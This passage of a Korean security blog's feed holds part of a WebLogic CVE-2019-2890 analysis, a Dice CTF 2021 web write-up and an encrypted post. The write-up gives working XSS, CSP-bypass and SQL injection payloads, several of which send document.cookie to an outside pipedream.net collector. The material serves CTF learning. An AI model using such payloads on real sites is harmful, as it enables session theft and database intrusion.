        clazz.asSubclass(Subject.class);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassExecption(<span class="string">&quot;Internal System Error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">this</span>.firstClassName = className;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>WSFilteringObjectInputStream</code> 메서드는 위와 같습니다.</p><hr><h2 id="CVE-2019-2890-Point"><a href="#CVE-2019-2890-Point" class="headerlink" title=" CVE-2019-2890 Point"></a><span style="color:#21C587"></span> CVE-2019-2890 Point</h2><ul><li>조건<br></li></ul><ol><li>웹 로직에서 T3 프로토콜이 열려있어야한다.</li><li>웹 로직에서 사용하고 있는 SerializedSystemIni.dat 파일을 릭할 수 있어야 한다.</li></ol><p>분석을 해본 결과 해당 취약점을 이용해서 익스를 하기 위해서는 위 2가지 조건을 충족해야 하는 거 같습니다. 긴 글 읽어주셔서 감사합니다.</p><hr>]]></content>
      
      
      <categories>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dice CTF Write Up</title>
      <link href="2021/02/08/2021-02-08-Dice-CTF/"/>
      <url>2021/02/08/2021-02-08-Dice-CTF/</url>
      
        <content type="html"><![CDATA[<p><img src="https://github.com/wjddnjs33/image2/blob/main/Dice%20CTF/dice%20main.png?raw=true"></p><p>2021년 2월 6일부터 8일 새벽까지는 Dice CTF의 모든 시간을 쏟아 웹 문제를 풀어보았습니다. 한 문제의 12 시간을 연달아 풀어본 적은 없었는 데 이번 대회에선 이렇게 열심히 풀었던 이유는 미국의 RGB 팀에 들어가기 위해서였습니다. RGB 팀의 미국 형님(팀장)은 날 원하는데 팀원들도 있기 때문에 Dice CTF에서 좋은 성과를 내서 팀원들한테도 인정을 받으라는 뉘앙스로 말씀을 하셔서였다. 여튼 이번 대회에서 해결 한 웹 5 문제 Write Up을 작성해보겠습니다.<br></p><hr><h2 id="Web-Babier-CSP-107-pts"><a href="#Web-Babier-CSP-107-pts" class="headerlink" title=" (Web) Babier CSP [107 pts]"></a><span style="color:#21C587"></span> (Web) Babier CSP [107 pts]</h2><blockquote><p>The Babier CSP challenge is a simple CSP Bypass challenge.</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">LRGWAXOY98Es0zz0QOVmag</span>==&gt;</span></span><br><span class="line"><span class="javascript">elem.onclick = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">  location = <span class="string">&quot;/?name=&quot;</span> + <span class="built_in">encodeURIComponent</span>([<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;orange&quot;</span>, <span class="string">&quot;pineapple&quot;</span>, <span class="string">&quot;pear&quot;</span>][<span class="built_in">Math</span>.floor(<span class="number">4</span> * <span class="built_in">Math</span>.random())]);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>If you check the source code, you can see that the nonce value of the script tag is set as above. I thought that the admin bot was also applying the nonce value as above.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script nonce&#x3D;LRGWAXOY98Es0zz0QOVmag&#x3D;&#x3D;&gt;alert(1)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script nonce&#x3D;LRGWAXOY98Es0zz0QOVmag&#x3D;&#x3D;&gt;location.href&#x3D;&quot;https:&#x2F;&#x2F;79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net&quot;%2bdocument.cookie&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>The payload used is as above.<br></p><blockquote><p>FLAG : dice{web_1s_a_stat3_0f_grac3_857720}</p></blockquote><hr><h2 id="Web-Missing-Flavortext-111-pts"><a href="#Web-Missing-Flavortext-111-pts" class="headerlink" title=" (Web) Missing Flavortext [111 pts]"></a><span style="color:#21C587"></span> (Web) Missing Flavortext [111 pts]</h2><blockquote><p> The Missing Flavortext challenge is a SQL Injection challenge that bypasses single quotas by using the features of express.js.</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ([req.body.username, req.body.password].some(<span class="function"><span class="params">v</span> =&gt;</span> v.includes(<span class="string">&#x27;\&#x27;&#x27;</span>))) &#123;</span><br><span class="line">  <span class="keyword">return</span> res.redirect(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In the code above, single quota is filtered using the includes function. However, this can be bypassed by passing it as an array because it only verifies strings.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin&amp;password[]&#x3D;1&amp;password[]&#x3D;&#39; or &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><p>The payload used is as above.<br></p><blockquote><p>FLAG : dice{sq1i_d03sn7_3v3n_3x1s7_4nym0r3}</p></blockquote><hr><h2 id="Web-Web-Utils-121-pts"><a href="#Web-Web-Utils-121-pts" class="headerlink" title=" (Web) Web Utils [121 pts]"></a><span style="color:#21C587"></span> (Web) Web Utils [121 pts]</h2><blockquote><p>TThe Web Utils challenge is a challenge that triggers XSS using a vulnerability when receiving the req.body value.</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// view.html</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">async</span>&gt;</span></span><br><span class="line"><span class="javascript">    (<span class="keyword">async</span> () =&gt; &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> id = <span class="built_in">window</span>.location.pathname.split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">2</span>];</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (! id) <span class="built_in">window</span>.location = <span class="built_in">window</span>.origin;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> res = <span class="keyword">await</span> fetch(<span class="string">`<span class="subst">$&#123;<span class="built_in">window</span>.origin&#125;</span>/api/data/<span class="subst">$&#123;id&#125;</span>`</span>);</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> &#123; data, type &#125; = <span class="keyword">await</span> res.json();</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (! data || ! type ) <span class="built_in">window</span>.location = <span class="built_in">window</span>.origin;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (type === <span class="string">&#x27;link&#x27;</span>) <span class="keyword">return</span> <span class="built_in">window</span>.location = data;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (<span class="built_in">document</span>.readyState !== <span class="string">&quot;complete&quot;</span>)</span></span><br><span class="line"><span class="javascript">        <span class="keyword">await</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">r</span>) =&gt;</span> &#123; <span class="built_in">window</span>.addEventListener(<span class="string">&#x27;load&#x27;</span>, r); &#125;);</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.title = <span class="string">&#x27;Paste&#x27;</span>;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.querySelector(<span class="string">&#x27;div&#x27;</span>).textContent = data;</span></span><br><span class="line">    &#125;)()</span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure><p>It is view.html code, and if the type is link in the middle, you can see window.location as data. And if data contains a payload such as <code>javascript:alert(1)</code>, you can trigger xss.<br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// api.js</span></span><br><span class="line">(skip)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="keyword">async</span> (fastify) =&gt; &#123;</span><br><span class="line">  fastify.post(<span class="string">&#x27;createLink&#x27;</span>, &#123;</span><br><span class="line">    handler: <span class="function">(<span class="params">req, rep</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> uid = database.generateUid(<span class="number">8</span>);</span><br><span class="line">      <span class="keyword">const</span> regex = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&#x27;^https?://&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span> (! regex.test(req.body.data))</span><br><span class="line">        <span class="keyword">return</span> rep</span><br><span class="line">        </span><br><span class="line">(skip)</span><br></pre></td></tr></table></figure><p>However, if you look at the link creation logic, the value of <code>req.body.data</code> is verified with a regular expression. So, you can’t put xss payload in the link creation logic.<br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// api.js</span></span><br><span class="line">(skip)</span><br><span class="line"></span><br><span class="line">fastify.post(<span class="string">&#x27;createPaste&#x27;</span>, &#123;</span><br><span class="line">    handler: <span class="function">(<span class="params">req, rep</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> uid = database.generateUid(<span class="number">8</span>);</span><br><span class="line">      database.addData(&#123; <span class="attr">type</span>: <span class="string">&#x27;paste&#x27;</span>, ...req.body, uid &#125;);</span><br><span class="line">      rep</span><br><span class="line">        .code(<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">(skip)</span><br></pre></td></tr></table></figure><p>However, if you look at the logic that creates the Pate, there is no verification for req.body, which causes a vulnerability here. Using this, you can give type as link and data as xss payload.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;data&quot;:&quot;javascript:alert(1)&quot;,&quot;type&quot;:&quot;link&quot;&#125;</span><br><span class="line">&#123;&quot;data&quot;:&quot;javascript:location.href&#x3D;&#39;https:&#x2F;&#x2F;79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net&#x2F;&#39;%2bdocument.cookie&quot;,&quot;type&quot;:&quot;link&quot;&#125;</span><br></pre></td></tr></table></figure><p>The payload used is as above.<br>   </p><blockquote><p>FLAG : dice{f1r5t_u53ful_j4v45cr1pt_r3d1r3ct}</p></blockquote><hr><h2 id="Web-Build-a-Panel-130-pts"><a href="#Web-Build-a-Panel-130-pts" class="headerlink" title=" (Web) Build a Panel [130 pts]"></a><span style="color:#21C587"></span> (Web) Build a Panel [130 pts]</h2><blockquote><p> The Build a Panel challenge is the challenge of reading flags using SQL Injection in the insert statement.</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">&#x27;/admin/debug/add_widget&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> cookies = req.cookies;</span><br><span class="line">    <span class="keyword">const</span> queryParams = req.query;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(cookies[<span class="string">&#x27;token&#x27;</span>] &amp;&amp; cookies[<span class="string">&#x27;token&#x27;</span>] == secret_token)&#123;</span><br><span class="line">        query = <span class="string">`INSERT INTO widgets (panelid, widgetname, widgetdata) VALUES (&#x27;<span class="subst">$&#123;queryParams[<span class="string">&#x27;panelid&#x27;</span>]&#125;</span>&#x27;, &#x27;<span class="subst">$&#123;queryParams[<span class="string">&#x27;widgetname&#x27;</span>]&#125;</span>&#x27;, &#x27;<span class="subst">$&#123;queryParams[<span class="string">&#x27;widgetdata&#x27;</span>]&#125;</span>&#x27;);`</span>;</span><br><span class="line">        db.run(query, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(err)&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(err);</span><br><span class="line">                res.send(<span class="string">&#x27;something went wrong&#x27;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                res.send(<span class="string">&#x27;success!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.redirect(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>This is the logic of add_widget running on admin bot. When looking at the query, the input value is entered without any verification, so SQL Injection can be performed.<br></p><p>If we put our panelid in panelid and a query that reads flag in widgetname, a widget is created on our server, and the widget name contains <code>FLAG</code>. (panelid is stored in a cookie.)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;build-a-panel.dicec.tf&#x2F;admin&#x2F;debug&#x2F;add_widget?panelid&#x3D;pocas&amp;widgetname&#x3D;adfdaf&amp;widgetdata&#x3D;a&#39;), (&#39;pocas&#39;, (select flag from flag), &#39;&#123;&quot;type&quot;:&quot;pocas&quot;&#125;&#39;)--</span><br></pre></td></tr></table></figure><p>The payload used is as above.<br> </p><blockquote><p>FLAG : dice{ch41n_ChAIn_aNd_m0Re_cHaIn}</p></blockquote><hr><h2 id="Web-Web-IDE-196-pts"><a href="#Web-Web-IDE-196-pts" class="headerlink" title=" (Web) Web IDE [196 pts]"></a><span style="color:#21C587"></span> (Web) Web IDE [196 pts]</h2><blockquote><p>The Web IDE challenge is a challenge that bypasses iframe sandbox and triggers XSS.</p></blockquote><ul><li>Scenario<br></li></ul><ol><li>We are using <code>allow-scripts</code> as an option for iframe, and the value we input is executed by the eval function in sandbox.html.</li><li>The path to the administrator’s cookie is /ide, so it is not easy to read the cookie. Because xss payload runs in /sandbox.html.</li><li>So, first you need to create a separate site and bypass the iframe sandbox.</li><li>If you bypass the iframe sandbox, you are not limited by sop, and you can freely execute xss payloads.</li><li>However, since xss payload is executed in <code>/sandbox.html</code>, it cannot read the admin cookie.</li><li>So, create an object using <code>window.open(&quot;/ide&quot;)</code>, and execute xss payload on the object to steal the cookie.<br></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>xss poc<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">sendMessage</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// window open -&gt; make file -&gt; include it</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> cmd=<span class="string">&quot;[].constructor.constructor(\&quot;(async () =&gt; &#123;const res = await fetch(&#x27;https://web-ide.dicec.tf/ide/save&#x27;, &#123;method:&#x27;POST&#x27;, headers: &#123;&#x27;Content-Type&#x27;: &#x27;application/javascript&#x27;&#125;, body: &#x27;const myWindow = window.open(\\\&quot;/ide\\\&quot;); (async (myWindow) =&gt; &#123; await setTimeout( async() =&gt; &#123;await fetch(`https://en20uuq0p0wxmkp.m.pipedream.net/?flag=$&#123;myWindow.document.cookie&#125;`)&#125;, 500) &#125;)(myWindow)&#x27;&#125;); const file_name = await res.text(); const scr = document.createElement(&#x27;script&#x27;); scr.src = `/ide/saves/$&#123;file_name&#125;`; document.body.appendChild(scr);&#125;)()\&quot;)()&quot;</span></span></span><br><span class="line">            </span><br><span class="line"><span class="javascript">            <span class="keyword">await</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">r</span>) =&gt;</span> &#123; <span class="built_in">window</span>.addEventListener((<span class="string">&#x27;load&#x27;</span>), r); &#125;);</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.querySelector(<span class="string">&#x27;iframe&#x27;</span>)</span></span><br><span class="line">              .contentWindow</span><br><span class="line"><span class="javascript">              .postMessage(cmd, <span class="string">&#x27;*&#x27;</span>);  <span class="comment">// IDE -&gt; sandbox message</span></span></span><br><span class="line">        &#125;;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;x&#x27;</span> <span class="attr">onerror</span>=<span class="string">&quot;sendMessage()&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&#x27;hh&#x27;</span> <span class="attr">src</span>=<span class="string">&quot;https://web-ide.dicec.tf/sandbox.html&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>The payload used is as above.<br> </p><blockquote><p>FLAG : dice{c0uldn7_f1nd_4_b4ckr0nym_f0r_1de}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> SQL Injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x41414141 CTF Write Up</title>
      <link href="2021/01/30/2021-01-31-0x414141410CTF/"/>
      <url>2021/01/30/2021-01-31-0x414141410CTF/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="303071a93fc4c459e824c55240c2ceb0f571aa8fb2b4602639c7b2a8bafe9b44">69260e113780454ef3070fe07292eff2da724a803d76bc8e0dd17c7e0ed2342418d2b7d7bf920758e16ebdc7c7f93f5f4b350d82cfe267d5e3a28a5a6b95c8d2326b39c6518dc9a4506a5a329605f35f4c80cea3df7ae9748dbc58f2a7237a9bbfc88f638e80f26c8fa1dab0f9c7478db8853c1fe175580d59c8af9c0f4b1b5744c1fc3e3e06cc2ff73470550d17eb94b90695fdc75da678a2295b34190949c0c8d3c038b46b00eceee98ce4e8aebfcf52966fde6c09dc2a3c33533da3fbc6185e9688b546189712fd9aa22080d87f4bce790799c0803270c8ce204c9257915eb385f701bc4ba89b35bc24561a7dd26f673c4da6093812a4fa9a4281e0ddb123980657d83d4a7d3b9d5a08210e18dca8c1dc96db3368b6160af52bbc5b5d733133eb277852329bf1c4be72a3d79a77a36a12fe68ea5923fec418f6d7d487622f13e63a1493da3790832bf04e3eeab1acfccae8eeb3132e68f5863a3882f90dc4cbd2259ebeb245cd729a05900e40ad0f96a7809bc17d04a9933d809e28eff5dbbe1132a1bd19647328d3225e0fd0b6c30447abeddac014f89dea15c1ec4a1ef727dec4a7a0bb3bf1db25ce11f72a363ec31db23e7bc8bde8953133504002bd989ed088cb51c3d89b14d2272e2b8f00cac5d15369dc6dbde3e8f8c0206e93e88a1316774b2cbe1ad7487cd9a0c033aa65203ef5319e66b7841f58de726bda41d9eeaef779331ae84d1810093e57c138d5378c447598a3ef9fe32a68034439dfeb558cb0b307dae768439f3dc23c1ede495c110d96ff85466b3ab2cca08cb4a7c0fc97c569f339e1bbe28548a27d02cace7528b1291f83fdbbf0e6c84753a8efe0366950cd2d6ce24a096ad0d38f306986c19084f6a5f3d36818d24cd9e9b409e226b2de355cb638656866178d073e14d08849e2ba7d1a21b0a911ab3ae1378f0b7d69cb8eadd41b915f93ea2a5467cdd2065e2dd56c42cb3b965b3a53edd5ee44a65ff4c263e7a43f7f3095e044c49d6a634d6f33752aee059e0f7368461d7c6dfec657b70925794514d24e2f46b3a42ae9e7ca82c76424c22d4fe7765a4d6bc5bd1596447b0fe84521f44e6cb097b20d24168f20e7c96a9b1eb146b65c646a768be235de6766605d0ba3ca0894268b74bdaba0ac5dce405826987ac1470f312155dda75f5530ff743643f87c3689df0b03874e7565e2852300ee372d0f38eaa90acc42bad29761150eeb58826b61dcffad3dd295512c43061c8d7370dc7b41a8e57477f49ecaf3286697f9115f57f4c6c331ba493b0d468f55f9cb05995abc90418af460bf88f5c2a8551e0db4f721032e281fec6c43bc882fe158951c8f3a83675e13bb119e4fd0221e43870dac7b7232f9985bf26a05268c625f709cb4169ae98e3e4626d1a383c35110d159ae36622043687c37cbcc6cdb1db9190d83e4a8be19a5ff85cba0319fe4d0ba5f4f39ee41da2ddfe2e2ca7d6b8c866eecaf9e3388d963d578282257109a72b6c24ffe502b3f05a2796a46875dd6806a213449a6eed21ddc00894d2ba4ea903d5281328041165da2c12274c8bbe694e9465bd561d4d6bed332095794cadc8847d285e207991ad18a7576073f1cfe502bf51a657885523c24439849ef5fc32c017691dec4090c66d081be31c7d7510eabc20ef7972cb5b3d189862db7080b8855e0cbdc0e95198e96417a046b0d16b85c0496d45137a1cac18f7d14b208add4fe5a67c0af363d000aacf7155e69be87fdfbe2b5c1ff6124c8d0895cdb330bece8c2e11ad0b5813325b05e20b93465de25b82aaaceb04e84dc1e6d589ef0ae62d361fd8add520c7e85500b7440a6c12f1465d83abf505fb651a385c2b2fe2d5814d71a4958dc41d171a1f0900914932320dafe0462b2438d0799a0fce8ffb0919cbd9a042c6647620905694771f3f1691080f3fee9661e504ad5b15d37aae8985bd1fef5cc52ddb0a1f8747b57d12f8f8cd9c551ff929eda6d2d797c3cd2bf18c038778e3cdd967d91f6810ce2e410fce2bd3a5b2104e364fdee29b6f936d848cd95f2189a20b54b6d5aec5ad62756fe56047d787d65b05fc87bfab7f2c039233e95e8afa623676200714be511b7fd2056b87a83bb5976ed9b40c19bca146a2a1231c7f745bab549ebb19bf35d85d92c84bd3e9212102bba7d26178b43005f75efb3159a2c895d68b6a9f879ecf39d9db4c1fd7199ff02fbe40c6c924c4405c3f2695276177dc49b6b037edae22bfc9320042f96db9a630c2abdb7fc9074680f322e6be0867f73f514291c7daca4bf9365c44b279df6d4377bef3acbfeb38ca3a09e9ec68e3849ad4c81aad7ee9c8f998e9fc63f0810a6529fac3d0951fb43d9d59346cb31dbf21bd476b735c5813b2b2c4719d6d3c56c55ed6402ca0308ce2c927d5b29c36184fa36f7e2c49d768f272dce8f3ab5a9b9ef26cc239c4c61c026f67bf1d7304d962ff4df8b7da3d1025f96f38b948938d2d95075eb6634e4874bdcf3700da5dc124d62ca8bf7acd144469ea963924e802ba92e4909ce34fdde09b45e7f81c1acd8ad2f89911d0b39d308780cc70f37106fe46a2625a96a9129204d8abe781544151c23393305769d5bbb195f0611be5159e265545faa991ceb1732aa31ac90f96719b91f8a8dda474d1f2b5e55a42c23efe3f5ab8a62f24f733918534ac92216e12451b44f7d79277c6d66e9cecad84cb93d35299681b87ac1fbc1b4ff9c2e9195ac0332c1e2e846b06fd8144d3bc379cff6438a3e8aaa042ce2e03fed06756d6d9f8e71be982d1a7ce14742ad5ebc0390a70dd52602859b7e3ddc650bca0a6ec38524637f38f89b2f0157d4b406d98f8ddfd03f119279b1e84ddfe69f92a3d219776629125c3c12ef6d739740cc10b76e0e94b34c91e98494fcf238cc8288a7c85a56ba17758f243bc2574f51b7f7672a9ed8670d90ed156964cc503b3811c915b351a29320a5d6c80dc1bfa26849b68aa77fcc4c70cf1fab9350e4fca8bab9d6f39967627a7f27d3d07c5fe7cf59207cc4fba7ba39cd4ce7015638ac57c6a02b34095a2b24c67cd6c1b9c2bcea8087d01b8143c2353a459e7fba3786aa6691005c3d4b4633ae3c31dcc95ac44472011c7545a056429c88013d32fec6dde8155de4538067d6aa50bb3c0017941d5b0e6bfe6be54056b8496d337ed5e1b5b73d9919a94d67a3b77a09a363c21e12c5d1673ffc02472fef0196bb69e13a962c2d2adcb065e83207c1c7a962031f69b759244dffead2d1e12633371677b5292c136d759c54815628527ef1cd7a18404e0ada726df5c074d31e06110ffcefa9aba010a811bc346d866ac6338e16555d93792a1e115f685246ea6ac2990d0e7194d24f3da00f299de57c956056851568d3f2c1700a28ab6ab847d00a8c595d45a4017be7efe8995c4ab33bb2f535522989f8c14dbad023114cea5b62922596d37e3e11f8004ca4f8609654f1d779b3b582aecbf3ee5d9c1c4a5ab40e68ec062466a71437d8897ec384be06d3ac23d2aa0a4782eff85c9001cd4b484cc4abde208b7e6fcaf1e105e5493f0aa12d6cd22b62267e2aaf1811e6b5f7ab3924bf209a7fb4a210dd713507c252342bf768ef7b5fdaa0d908a59c965bcd1ace523eac43dae4bbffa34e13d4848d9d02a898bb45744e27190105160f530b1e820f2b0ea814f839489f8776cca7bc64a6410ee3ead6d05be672f2ed8a9a5ad0b90f6e0c10347c1317a732e1577afc0c2e33a6beeff19023857fe45f0a07f7474ba27b14781019c3eee68ec6e41f26489b9887e7a3a1845ece16e163edb5e46f4c1d351d41c207b8adbe45c9e819300efadfe59cc0392ebaef31506b01f0df620638d1bc47dc81e6c109ff0cf43551b0ab008714e6537ce392f2b2652b4a6ed7ae42997b2afd5a90b3302a63e856359751aee5e2f1e616953f47a207138a152a7b6da9c548f46bbb21363bdbdc9d3903804b771ca57b26f6b3582fe3340d49b8aa5b83e919f8c3390d10ad10a629e2835ffb965bb74253c921e91baec7af76f94b2344c5a60eb9add28e7ab5b7039c0163c7b3a33151265f8135d2dc47423b4825ae5b998c1388149326dc4a1dd0d1a37ceea76f3213cb4a90e5b240560d62a507f3040701275c4001663ef1d6f44f1ebd83268087d313f6425f3fd0f2872c5b8eff2ecc08bbdc4a4ded15c88dfc76632dd7059ffdde2c02a3e551feee03e153266fafb37adfc69a0f36a17fc45356a0c5970bff9b702599d94254af580f98cfce6129ca1a1909ee046c76ca5d375475ddea35ac12c4dce8d1de59624172efc800621e268a8fc5a0bbd0fe3e0c767b939932755ce341663ff2cc79dca5858a0a64f233a67a11d2767bcee359bb8cc1190b6b1685cb2d94f8b1791118cf0b013ed0b9703a01a4a9d74f421c4696e012281f6c50026ad7bdd7b5b523178379d60e4f82e9913296bb0ff7860f3e12203336ea16b4e71458679bd721dc9ab170ccc259c71a13a5cd3d2d7ef44fd235e3a2ca95dfcf11a8e59fbfdbb7a3fb72865a4bcc49a7406c3c8c12bc8adeef7ca6127df97305c2dddbd198847fac2032fc09518ffd597f9fdde93a66de77c78c0c40d7a5d9af1cec2cce09e3ca7b996a18a3cab49450b5417d8a73ac702c72ac6b7b88d338a8fe27e010e98da3bc4cd7f9d404eba7542476111f2b4c05d4d08b579ac8f6c617240d2d1090182390ee130db19c7d9f55946d1f8b7814ec50f5712af47698e1bd4ff48cef099829b93d3f743ba02d08b6620ddc9cf54121c77fcf266aad4b9ade676ff551c9ee103d7daf62cd3c17640c46ad8d44c2d87b0da031cd2854ee4afe1c788c04b91c5f520bb607a44fb5a393a03ff23c795b95c0c5bf091e81101c04685f6d361b1c6adc4e118429ac487c22b3977c2696a74af562ab06568f66342d8aebfdc673a57f651aac62abe10f4c9f731dcc4c3fb5783756d977bbd39a18729c